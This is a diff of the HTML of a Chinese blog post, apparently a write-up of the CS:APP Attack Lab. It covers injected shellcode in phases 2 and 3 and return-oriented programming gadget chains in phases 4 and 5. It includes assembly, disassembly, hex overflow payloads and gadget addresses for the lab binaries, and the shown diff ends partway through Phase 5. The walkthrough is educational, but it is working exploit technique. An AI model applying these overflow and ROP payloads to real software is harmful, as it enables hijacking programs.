-<p>根据 gdb，发现 touch2 判断通过之后还需要执行一个 validate 函数，这个函数调用 notify_server 函数，执行这个函数时发生了段错误，可能是我们注入的 touch2 地址破坏了什么东西
-看样子我们不能溢出太多，不然会造成莫名其妙的破坏，于是我考虑另一个方案，跳到我注入的代码之后，我先把 <code>%rsp</code> 减少 8，然后再把 touch 地址写到 <code>(%rsp)</code> 处，这样就确保对栈破坏最小</p>
+<p>根据 gdb，发现 touch2 判断通过之后还需要执行一个 validate 函数，这个函数调用 notify_server 函数，执行这个函数时发生了段错误，可能是我们注入的 touch2 地址破坏了什么东西</p>
+<p>看样子我们不能溢出太多，不然会造成莫名其妙的破坏，于是我考虑另一个方案，跳到我注入的代码之后，我先把 <code>%rsp</code> 减少 8，然后再把 touch 地址写到 <code>(%rsp)</code> 处，这样就确保对栈破坏最小</p>
 <pre><div class="head"><div class="language">Unknown</div><div class="copy" data="JTIwJTIwJTIwJTIwbW92cSUyMCUyNDB4NTliOTk3ZmElMkMlMjAlMjVyZGklMEElMjAlMjAlMjAlMjBhZGQlMjAlMjQtOCUyQyUyMCUyNXJzcCUwQSUyMCUyMCUyMCUyMG1vdnElMjAlMjQweDAwNDAxN2VjJTJDJTIwKCUyNXJzcCklMEElMjAlMjAlMjAlMjByZXQlMEE="><svg focusable="false" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2m0 16H8V7h11z"></path></svg></div></div><code class="hljs"><div class="lines"><div>1</div><div>2</div><div>3</div><div>4</div></div><div class="code">    movq $0x59b997fa, %rdi
     add $-8, %rsp
     movq $0x004017ec, (%rsp)
     ret
 </div></code></pre>
 <p>得到二进制：</p>
-<pre><div class="head"><div class="language">Unknown</div><div class="copy" data="YW5zMi5vJTNBJTIwJTIwJTIwJTIwJTIwZmlsZSUyMGZvcm1hdCUyMGVsZjY0LXg4Ni02NCUwQURpc2Fzc2VtYmx5JTIwb2YlMjBzZWN0aW9uJTIwLnRleHQlM0ElMEEwMDAwMDAwMDAwMDAwMDAwJTIwJTNDLnRleHQlM0UlM0ElMEElMjAlMjAlMjAwJTNBJTA5NDglMjBjNyUyMGM3JTIwZmElMjA5NyUyMGI5JTIwNTklMjAlMDltb3YlMjAlMjAlMjAlMjAlMjQweDU5Yjk5N2ZhJTJDJTI1cmRpJTBBJTIwJTIwJTIwNyUzQSUwOTQ4JTIwODMlMjBjNCUyMGY4JTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTA5YWRkJTIwJTIwJTIwJTIwJTI0MHhmZmZmZmZmZmZmZmZmZmY4JTJDJTI1cnNwJTBBJTIwJTIwJTIwYiUzQSUwOTQ4JTIwYzclMjAwNCUyMDI0JTIwZWMlMjAxNyUyMDQwJTIwJTA5bW92cSUyMCUyMCUyMCUyNDB4NDAxN2VjJTJDKCUyNXJzcCklMEElMjAlMjAxMiUzQSUwOTAwJTBBJTIwJTIwMTMlM0ElMDljMyUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUwOXJldCUwQQ=="><svg focusable="false" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2m0 16H8V7h11z"></path></svg></div></div><code class="hljs"><div class="lines"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div><div>7</div><div>8</div></div><div class="code">ans2.o:     file format elf64-x86-64
+<pre><div class="head"><div class="language">Unknown</div><div class="copy" data="JTBBYW5zMi5vJTNBJTIwJTIwJTIwJTIwJTIwZmlsZSUyMGZvcm1hdCUyMGVsZjY0LXg4Ni02NCUwQSUwQSUwQURpc2Fzc2VtYmx5JTIwb2YlMjBzZWN0aW9uJTIwLnRleHQlM0ElMEElMEEwMDAwMDAwMDAwMDAwMDAwJTIwJTNDLnRleHQlM0UlM0ElMEElMjAlMjAlMjAwJTNBJTA5NDglMjBjNyUyMGM3JTIwZmElMjA5NyUyMGI5JTIwNTklMjAlMDltb3YlMjAlMjAlMjAlMjAlMjQweDU5Yjk5N2ZhJTJDJTI1cmRpJTBBJTIwJTIwJTIwNyUzQSUwOTQ4JTIwODMlMjBjNCUyMGY4JTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTA5YWRkJTIwJTIwJTIwJTIwJTI0MHhmZmZmZmZmZmZmZmZmZmY4JTJDJTI1cnNwJTBBJTIwJTIwJTIwYiUzQSUwOTQ4JTIwYzclMjAwNCUyMDI0JTIwZWMlMjAxNyUyMDQwJTIwJTA5bW92cSUyMCUyMCUyMCUyNDB4NDAxN2VjJTJDKCUyNXJzcCklMEElMjAlMjAxMiUzQSUwOTAwJTBBJTIwJTIwMTMlM0ElMDljMyUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUwOXJldCUwQSUwQQ=="><svg focusable="false" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2m0 16H8V7h11z"></path></svg></div></div><code class="hljs"><div class="lines"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div><div>7</div><div>8</div><div>9</div><div>10</div><div>11</div><div>12</div><div>13</div></div><div class="code">
+ans2.o:     file format elf64-x86-64
+
+
 Disassembly of section .text:
+
 0000000000000000 &lt;.text&gt;:
    0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
    7:	48 83 c4 f8          	add    $0xfffffffffffffff8,%rsp
    b:	48 c7 04 24 ec 17 40 	movq   $0x4017ec,(%rsp)
   12:	00
   13:	c3                   	ret
+
 </div></code></pre>
 <p>构造</p>
 <pre><div class="head"><div class="language">Unknown</div><div class="copy" data="MDAlMjAwMCUyMDAwJTIwMDAlMjAwMCUyMDAwJTIwMDAlMjAwMCUyMDAwJTIwMDAlMjAwMCUyMDAwJTIwMDAlMjAwMCUyMDAwJTIwMDAlMjAwMCUyMDAwJTIwMDAlMjAwMCUyMDQ4JTIwYzclMjBjNyUyMGZhJTIwOTclMjBiOSUyMDU5JTIwNDglMjA4MyUyMGM0JTIwZjglMjA0OCUyMGM3JTIwMDQlMjAyNCUyMGVjJTIwMTclMjA0MCUyMDAwJTIwYzMlMEE4YyUyMGRjJTIwNjElMjA1NSUwQTBhJTBB"><svg focusable="false" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2m0 16H8V7h11z"></path></svg></div></div><code class="hljs"><div class="lines"><div>1</div><div>2</div><div>3</div></div><div class="code">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 48 c7 c7 fa 97 b9 59 48 83 c4 f8 48 c7 04 24 ec 17 40 00 c3
 8c dc 61 55
 0a
 </div></code></pre>
-<p>终于通过
-不过后续在做 Phase 3 的时候实在好奇为什么不能再往上多修改一些栈数据，不能多修改的话可能会影响 Phase 3 的发挥。
-在 gdb 中，触发段错误后，使用 disas 看到了触发段错误的指令：<code>movaps %xmm0,-0x40(%rbp)</code> 查看 <code>%rbp</code> 的值是正常的，应该不是引用了非法内存，这就很奇怪了，于是询问 ai 得知，<code>movaps</code> 这个涉及到 <code>%xmm0</code>（涉及到的原因应该不是浮点运算，应该是使用 <code>%xmm0</code> 做向量运算），这个指令要求目的地址按 16 字节对齐，一般情况下编译器会自动保证这里是满足对齐要求的，但是我们之前修改了 <code>%rsp</code> ，可能破坏了对齐</p>
+<p>终于通过</p>
+<p>不过后续在做 Phase 3 的时候实在好奇为什么不能再往上多修改一些栈数据，不能多修改的话可能会影响 Phase 3 的发挥。</p>
+<p>在 gdb 中，触发段错误后，使用 disas 看到了触发段错误的指令：<code>movaps %xmm0,-0x40(%rbp)</code> 查看 <code>%rbp</code> 的值是正常的，应该不是引用了非法内存，这就很奇怪了，于是询问 ai 得知，<code>movaps</code> 这个涉及到 <code>%xmm0</code>（涉及到的原因应该不是浮点运算，应该是使用 <code>%xmm0</code> 做向量运算），这个指令要求目的地址按 16 字节对齐，一般情况下编译器会自动保证这里是满足对齐要求的，但是我们之前修改了 <code>%rsp</code> ，可能破坏了对齐</p>
 <h3 id="phase-3" tabindex="-1">Phase 3</h3>
-<p>这次要求我们让程序跳转到 touch3，要求我们不仅注入代码还要注入特定字符串，并传递字符串指针作为 touch3 的参数
-cookie 对应的 ascii 码的十六进制表示为 <code>0x6166373939623935</code>，然后再加一个 <code>00</code> 结尾。首先一个问题是这个字符串数据放在哪里。一开始怕破坏太多栈空间导致段错误（后来才知道是对齐的原因），所以考虑把数据放在栈中比较靠近底部的位置，然后在自己注入的代码中去注入数据：</p>
+<p>这次要求我们让程序跳转到 touch3，要求我们不仅注入代码还要注入特定字符串，并传递字符串指针作为 touch3 的参数</p>
+<p>cookie 对应的 ascii 码的十六进制表示为 <code>0x6166373939623935</code>，然后再加一个 <code>00</code> 结尾。首先一个问题是这个字符串数据放在哪里。一开始怕破坏太多栈空间导致段错误（后来才知道是对齐的原因），所以考虑把数据放在栈中比较靠近底部的位置，然后在自己注入的代码中去注入数据：</p>
 <pre><div class="head"><div class="language">Unknown</div><div class="copy" data="JTIwJTIwJTIwJTIwbW92cSUyMCUyNDB4NjE2NjM3MzkzOTYyMzkzNSUyQyUyMCUyNXI4JTBBJTIwJTIwJTIwJTIwbW92cSUyMCUyNXI4JTJDJTIwMHg1NTYyMDAwMCUwQSUyMCUyMCUyMCUyMG1vdnElMjAlMjQweDAwJTJDJTIwMHg1NTYyMDAwOCUwQSUyMCUyMCUyMCUyMG1vdnElMjAlMjQweDU1NjIwMDAwJTJDJTIwJTI1cmRpJTBBJTIwJTIwJTIwJTIwYWRkJTIwJTI0LTglMkMlMjAlMjVyc3AlMEElMjAlMjAlMjAlMjBtb3ZxJTIwJTI0MHgwMDQwMThmYSUyQyUyMCglMjVyc3ApJTBBJTIwJTIwJTIwJTIwcmV0JTBB"><svg focusable="false" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2m0 16H8V7h11z"></path></svg></div></div><code class="hljs"><div class="lines"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div><div>7</div></div><div class="code">    movq $0x6166373939623935, %r8
     movq %r8, 0x55620000
     movq $0x00, 0x55620008
@@ -370,9 +504,9 @@ cookie 对应的 ascii 码的十六进制表示为 <code>0x6166373939623935</cod
     movq $0x004018fa, (%rsp)
     ret
 </div></code></pre>
-<p>不过遗憾的是这样编译出来的代码太大，超过了 40 字节，导致后面无法再篡改返回值地址了
-观察 x86-64 指令的编码，如果直接指定内存的地址，那么会直接占用 8 字节，而如果是根据寄存器 + 偏移进行寻址的话编码大小会少一些
-目前比较好控制的寄存器就是 <code>%rsp</code> 了，当跳到我们注入的代码之后，此时 <code>%rsp</code> 指向 test 函数的栈顶，我们考虑把数据直接注入到 <code>%rsp</code> 上</p>
+<p>不过遗憾的是这样编译出来的代码太大，超过了 40 字节，导致后面无法再篡改返回值地址了</p>
+<p>观察 x86-64 指令的编码，如果直接指定内存的地址，那么会直接占用 8 字节，而如果是根据寄存器 + 偏移进行寻址的话编码大小会少一些</p>
+<p>目前比较好控制的寄存器就是 <code>%rsp</code> 了，当跳到我们注入的代码之后，此时 <code>%rsp</code> 指向 test 函数的栈顶，我们考虑把数据直接注入到 <code>%rsp</code> 上</p>
 <pre><div class="head"><div class="language">Unknown</div><div class="copy" data="JTIwJTIwJTIwJTIwbW92cSUyMCUyNDB4NjE2NjM3MzkzOTYyMzkzNSUyQyUyMCUyNXI4JTBBJTIwJTIwJTIwJTIwbW92cSUyMCUyNXI4JTJDJTIwKCUyNXJzcCklMEElMjAlMjAlMjAlMjBtb3ZxJTIwJTI0MHgwMCUyQyUyMDgoJTI1cnNwKSUwQSUyMCUyMCUyMCUyMG1vdnElMjAlMjVyc3AlMkMlMjAlMjVyZGklMEElMjAlMjAlMjAlMjBhZGQlMjAlMjQtOCUyQyUyMCUyNXJzcCUwQSUyMCUyMCUyMCUyMG1vdnElMjAlMjQweDAwNDAxOGZhJTJDJTIwKCUyNXJzcCklMEElMjAlMjAlMjAlMjByZXQlMEE="><svg focusable="false" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2m0 16H8V7h11z"></path></svg></div></div><code class="hljs"><div class="lines"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div><div>7</div></div><div class="code">    movq $0x6166373939623935, %r8
     movq %r8, (%rsp)
     movq $0x00, 8(%rsp)
@@ -388,16 +522,16 @@ cookie 对应的 ascii 码的十六进制表示为 <code>0x6166373939623935</cod
 </div></code></pre>
 <p>通过</p>
 <h3 id="phase-4" tabindex="-1">Phase 4</h3>
-<p>从这个 phase 开始，我们需要一个新的被称为 ROP 的攻击手段。任务指导书中介绍了这个手段。
-大概就是，如果程序的栈地址是随机化的，且栈所处的内存被记为不可执行，那么前面的代码注入的方法就行不通了，甚至使用 nop sled 都无法发挥作用。ROP 考虑利用现有的代码，汇编指令都是一个一个放置的，只有我们找对了第一个指令的起始地址，那么后续指令就会一个一个跟着执行，但是如果我们截取现有代码中的一部分指令，比如从一个完整的指令中间开始解码指令，有可能就能得到我们想执行的恶意代码。一般我们需要反编译程序然后找到这种指令的首地址。我们可能更倾向于找最后是 <code>0xc3</code> 结尾的部分，因为 <code>0x3c</code> 在 x86-64 中是 <code>ret</code> 指令，这样的话我们可以在执行一部分恶意代码之后跳到下一个地方执行恶意代码。
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/21/687e2ad501bd7.png" style="transform: scale(1)" width=1100 height=549></div>
-本次 lab 为了简单起见，要攻击的程序 <code>rtarget</code> 里面有很多奇怪函数，目的是暴露潜在的恶意指令，方便我们攻击。并且任务指导书中划定了寻找可以利用的指令的范围。
-Phase 4 需要我们像 Phase 2 那样进行攻击，大概就是我们需要寻找可以利用的指令，这些指令可以调用 touch2 并传递一个参数
-要注入数据的话，直接从现有指定中找应该是几乎不可能的。不过指导书里有一个提示，我们可以考虑利用 <code>pop</code> 指令，这个可以把当前栈顶数据弹到寄存器，而栈顶的元素我们是可以自己去设置的
-那么我们现在要寻找的目标是一个 <code>pop %rdi</code> 或者是 <code>pop</code> 后再 <code>mov</code> 到 <code>%rdi</code>
-指令对应的字节如下：
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/21/687e2e6979daf.png" style="transform: scale(1)" width=1955 height=882></div>
-首先是这里</p>
+<p>从这个 phase 开始，我们需要一个新的被称为 ROP 的攻击手段。任务指导书中介绍了这个手段。</p>
+<p>大概就是，如果程序的栈地址是随机化的，且栈所处的内存被记为不可执行，那么前面的代码注入的方法就行不通了，甚至使用 nop sled 都无法发挥作用。ROP 考虑利用现有的代码，汇编指令都是一个一个放置的，只有我们找对了第一个指令的起始地址，那么后续指令就会一个一个跟着执行，但是如果我们截取现有代码中的一部分指令，比如从一个完整的指令中间开始解码指令，有可能就能得到我们想执行的恶意代码。一般我们需要反编译程序然后找到这种指令的首地址。我们可能更倾向于找最后是 <code>0xc3</code> 结尾的部分，因为 <code>0x3c</code> 在 x86-64 中是 <code>ret</code> 指令，这样的话我们可以在执行一部分恶意代码之后跳到下一个地方执行恶意代码。</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/21/687e2ad501bd7.png" style="transform: scale(1)" width=1100 height=549></div></p>
+<p>本次 lab 为了简单起见，要攻击的程序 <code>rtarget</code> 里面有很多奇怪函数，目的是暴露潜在的恶意指令，方便我们攻击。并且任务指导书中划定了寻找可以利用的指令的范围。</p>
+<p>Phase 4 需要我们像 Phase 2 那样进行攻击，大概就是我们需要寻找可以利用的指令，这些指令可以调用 touch2 并传递一个参数</p>
+<p>要注入数据的话，直接从现有指定中找应该是几乎不可能的。不过指导书里有一个提示，我们可以考虑利用 <code>pop</code> 指令，这个可以把当前栈顶数据弹到寄存器，而栈顶的元素我们是可以自己去设置的</p>
+<p>那么我们现在要寻找的目标是一个 <code>pop %rdi</code> 或者是 <code>pop</code> 后再 <code>mov</code> 到 <code>%rdi</code></p>
+<p>指令对应的字节如下：</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/21/687e2e6979daf.png" style="transform: scale(1)" width=1955 height=882></div></p>
+<p>首先是这里</p>
 <pre><div class="head"><div class="language">text</div><div class="copy" data="MDAwMDAwMDAwMDQwMTlhNyUyMCUzQ2FkZHZhbF8yMTklM0UlM0ElMEElMjAlMjA0MDE5YTclM0ElMDk4ZCUyMDg3JTIwNTElMjA3MyUyMDU4JTIwOTAlMjAlMjAlMjAlMjAlMDlsZWElMjAlMjAlMjAlMjAtMHg2ZmE3OGNhZiglMjVyZGkpJTJDJTI1ZWF4JTBBJTIwJTIwNDAxOWFkJTNBJTA5YzMlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMDlyZXQlMEE="><svg focusable="false" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2m0 16H8V7h11z"></path></svg></div></div><code class="hljs"><div class="lines"><div>1</div><div>2</div><div>3</div></div><div class="code">00000000004019a7 &lt;addval_219&gt;:
   4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
   4019ad:	c3                   	ret
@@ -407,9 +541,9 @@ Phase 4 需要我们像 Phase 2 那样进行攻击，大概就是我们需要寻
   4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
   4019a6:	c3                   	ret
 </div></code></pre>
-<p>中的 <code>48 89 c7</code> 则可以直接让我们把注入的数据传到参数中，后面的 <code>c3</code> 直接返回
-两者的地址分别是 <code>0x4019ab</code> 和 <code>0x4019a2</code>，touch2 的地址为 <code>0x4017ec</code>
-于是我们这么构造：</p>
+<p>中的 <code>48 89 c7</code> 则可以直接让我们把注入的数据传到参数中，后面的 <code>c3</code> 直接返回</p>
+<p>两者的地址分别是 <code>0x4019ab</code> 和 <code>0x4019a2</code>，touch2 的地址为 <code>0x4017ec</code></p>
+<p>于是我们这么构造：</p>
 <pre><div class="head"><div class="language">text</div><div class="copy" data="MDAlMjAwMCUyMDAwJTIwMDAlMjAwMCUyMDAwJTIwMDAlMjAwMCUyMDAwJTIwMDAlMjAwMCUyMDAwJTIwMDAlMjAwMCUyMDAwJTIwMDAlMjAwMCUyMDAwJTIwMDAlMjAwMCUyMDAwJTIwMDAlMjAwMCUyMDAwJTIwMDAlMjAwMCUyMDAwJTIwMDAlMjAwMCUyMDAwJTIwMDAlMjAwMCUyMDAwJTIwMDAlMjAwMCUyMDAwJTIwMDAlMjAwMCUyMDAwJTIwMDAlMEFhYiUyMDE5JTIwNDAlMjAwMCUyMDAwJTIwMDAlMjAwMCUyMDAwJTBBZmElMjA5NyUyMGI5JTIwNTklMjAwMCUyMDAwJTIwMDAlMjAwMCUwQWEyJTIwMTklMjA0MCUyMDAwJTIwMDAlMjAwMCUyMDAwJTIwMDAlMEFlYyUyMDE3JTIwNDAlMjAwMCUyMDAwJTIwMDAlMjAwMCUyMDAwJTBBYTAlMEE="><svg focusable="false" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2m0 16H8V7h11z"></path></svg></div></div><code class="hljs"><div class="lines"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div></div><div class="code">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 ab 19 40 00 00 00 00 00
 fa 97 b9 59 00 00 00 00
@@ -419,14 +553,14 @@ a0
 </div></code></pre>
 <p>显示填充缓冲区，然后是第一次跳转地址（到 <code>pop</code>），然后是注入数据，然后是第二次跳转地址（到 <code>mov</code>），然后是第三次跳转地址（到 touch2）</p>
 <h3 id="phase-5" tabindex="-1">Phase 5</h3>
-<p>指导书在这里开始有点劝退还挺有意思（）
-首先提到这里需要用到一些新的指令
-<div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/21/687e2e971bbc0.png" style="transform: scale(1)" width=1583 height=970></div>
-D 组比较有意思，这些指令执行之后并不会改变任何寄存器，可以视为 <code>nop</code> 指令
-以及提到了标准答案用到了 8 个 gadgets，非常可怕
-同时还说到了 <code>movl</code> 会将寄存器的高 32 位清零
-首先我们要考虑还和上面一样注入字符串的数据。字符串指针的数据比较难搞，因为我们现在不知道栈的具体地址，不能直接把指针指向栈上。而给出的指令都没有涉及到内存寻址。
-我想到一个办法，可以考虑把数据正好注入在最后执行 touch3 之前的栈顶上，然后把 <code>%rsp</code> 赋值给 <code>%rdi</code>。不过对应的 <code>48 89 e7</code> 没有在代码中找到。反而是观察到了 <code>48 89 e0</code> 有很多，对应于 <code>mov %rsp,%rax</code>。我们过滤掉一些不能用的（即 <code>48 89 e0</code> 后面还跟着其他未知指令），还有这些：</p>
+<p>指导书在这里开始有点劝退还挺有意思（）</p>
+<p>首先提到这里需要用到一些新的指令</p>
+<p><div class="img-box"><img class="lazy" date-src="https://pic.caiwen.work/i/2025/07/21/687e2e971bbc0.png" style="transform: scale(1)" width=1583 height=970></div></p>
+<p>D 组比较有意思，这些指令执行之后并不会改变任何寄存器，可以视为 <code>nop</code> 指令</p>
+<p>以及提到了标准答案用到了 8 个 gadgets，非常可怕</p>
+<p>同时还说到了 <code>movl</code> 会将寄存器的高 32 位清零</p>
+<p>首先我们要考虑还和上面一样注入字符串的数据。字符串指针的数据比较难搞，因为我们现在不知道栈的具体地址，不能直接把指针指向栈上。而给出的指令都没有涉及到内存寻址。</p>
+<p>我想到一个办法，可以考虑把数据正好注入在最后执行 touch3 之前的栈顶上，然后把 <code>%rsp</code> 赋值给 <code>%rdi</code>。不过对应的 <code>48 89 e7</code> 没有在代码中找到。反而是观察到了 <code>48 89 e0</code> 有很多，对应于 <code>mov %rsp,%rax</code>。我们过滤掉一些不能用的（即 <code>48 89 e0</code> 后面还跟着其他未知指令），还有这些：</p>
 <pre><div class="head"><div class="language">Unknown</div><div class="copy" data="MDAwMDAwMDAwMDQwMWEwMyUyMCUzQ2FkZHZhbF8xOTAlM0UlM0ElMEElMjAlMjA0MDFhMDMlM0ElMDk4ZCUyMDg3JTIwNDElMjA0OCUyMDg5JTIwZTAlMjAlMjAlMjAlMjAlMDlsZWElMjAlMjAlMjAlMjAtMHgxZjc2YjdiZiglMjVyZGkpJTJDJTI1ZWF4JTBBJTIwJTIwNDAxYTA5JTNBJTA5YzMlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMDlyZXQlMEEwMDAwMDAwMDAwNDAxYWFiJTIwJTNDc2V0dmFsXzM1MCUzRSUzQSUwQSUyMCUyMDQwMWFhYiUzQSUwOWM3JTIwMDclMjA0OCUyMDg5JTIwZTAlMjA5MCUyMCUyMCUyMCUyMCUwOW1vdmwlMjAlMjAlMjAlMjQweDkwZTA4OTQ4JTJDKCUyNXJkaSklMEElMjAlMjA0MDFhYjElM0ElMDljMyUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUyMCUwOXJldCUwQQ=="><svg focusable="false" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2m0 16H8V7h11z"></path></svg></div></div><code class="hljs"><div class="lines"><div>1</div><div>2</div><div>3</div><div>4</div><div>5</div><div>6</div></div><div class="code">0000000000401a03 &lt;addval_190&gt;:
   401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
   401a09:	c3                   	ret
@@ -439,24 +573,26 @@ D 组比较有意思，这些指令执行之后并不会改变任何寄存器，
   4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
   4019c9:	c3                   	ret
 </div></code></pre>
-<p>不过还有一点，我们把 <code>%rsp</code> 传给 <code>%rax</code> 时，<code>%rsp</code> 指向的内容是一个 8 字节的下一步要跳转的地址，我们是不可能在这个地方放置数据的
-一个想法是，我们希望 <code>mov %rsp,%rax</code> 之后再 <code>pop</code> 一下，让 <code>%rsp</code> 往下走一下
-要实现这个，我们可能需要 <code>89 e0</code> 到 <code>89 e7</code> 后面找 <code>58</code> 到 <code>5f</code>，可惜根本找不到。
-于是到这里就完全卡住了，我几乎把能用到的指令全找出来了。大概是：</p>
+<p>不过还有一点，我们把 <code>%rsp</code> 传给 <code>%rax</code> 时，<code>%rsp</code> 指向的内容是一个 8 字节的下一步要跳转的地址，我们是不可能在这个地方放置数据的</p>
+<p>一个想法是，我们希望 <code>mov %rsp,%rax</code> 之后再 <code>pop</code> 一下，让 <code>%rsp</code> 往下走一下</p>
+<p>要实现这个，我们可能需要 <code>89 e0</code> 到 <code>89 e7</code> 后面找 <code>58</code> 到 <code>5f</code>，可惜根本找不到。</p>
+<p>于是到这里就完全卡住了，我几乎把能用到的指令全找出来了。大概是：</p>
 <ul>
 <li>可以使用 <code>pop %rax</code> 将栈中数据转移到 <code>%rax</code></li>
-<li>可以通过 <code>mov</code> 指令将 <code>%esp</code> 数据转移到 <code>%rax</code>
-然后数据从 <code>%rax</code> 有两个走向</li>
-<li><code>%rax</code> -&gt; <code>%edi</code></li>
-<li><code>%rax</code> -&gt; <code>%edx</code> -&gt; <code>%ecx</code> -&gt; <code>%esi</code>
-不过现在还是难以获得注入字符串数据的指针。在这里卡了快一天了，最后直接让 ai 给了一点提示。ai 说注意使用 <code>lea</code> 指令。于是我突然意识到，我们不光可以从字节中直接截取出指令，还能直接利用现有的指令，比如这里就有个非常关键的地方：</li>
+<li>可以通过 <code>mov</code> 指令将 <code>%esp</code> 数据转移到 <code>%rax</code></li>
 </ul>
+<p>然后数据从 <code>%rax</code> 有两个走向</p>
+<ul>
+<li><code>%rax</code> -&gt; <code>%edi</code></li>
+<li><code>%rax</code> -&gt; <code>%edx</code> -&gt; <code>%ecx</code> -&gt; <code>%esi</code></li>
+</ul>
+<p>不过现在还是难以获得注入字符串数据的指针。在这里卡了快一天了，最后直接让 ai 给了一点提示。ai 说注意使用 <code>lea</code> 指令。于是我突然意识到，我们不光可以从字节中直接截取出指令，还能直接利用现有的指令，比如这里就有个非常关键的地方：</p>
 <pre><div class="head"><div class="language">Unknown</div><div class="copy" data="MDAwMDAwMDAwMDQwMTlkNiUyMCUzQ2FkZF94eSUzRSUzQSUwQSUyMCUyMDQwMTlkNiUzQSUwOTQ4JTIwOGQlMjAwNCUyMDM3JTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTIwJTA5bGVhJTIwJTIwJTIwJTIwKCUyNXJkaSUyQyUyNXJzaSUyQzEpJTJDJTI1cmF4JTBBJTIwJTIwNDAxOWRhJTNBJTA5YzMlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMDlyZXQlMEE="><svg focusable="false" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2m0 16H8V7h11z"></path></svg></div></div><code class="hljs"><div class="lines"><div>1</div><div>2</div><div>3</div></div><div class="code">00000000004019d6 &lt;add_xy&gt;:
   4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
   4019da:	c3                   	ret
 </div></code></pre>
-<p>这个可以让 <code>%rax</code> 变为 <code>%rdi + %rsi</code>，而 <code>%rdi</code> 和 <code>%rsi</code> 是可以根据我们上面分析出来的数据走向得到的
-先整理一下我们用到的指令的地址：</p>
+<p>这个可以让 <code>%rax</code> 变为 <code>%rdi + %rsi</code>，而 <code>%rdi</code> 和 <code>%rsi</code> 是可以根据我们上面分析出来的数据走向得到的</p>
+<p>先整理一下我们用到的指令的地址：</p>
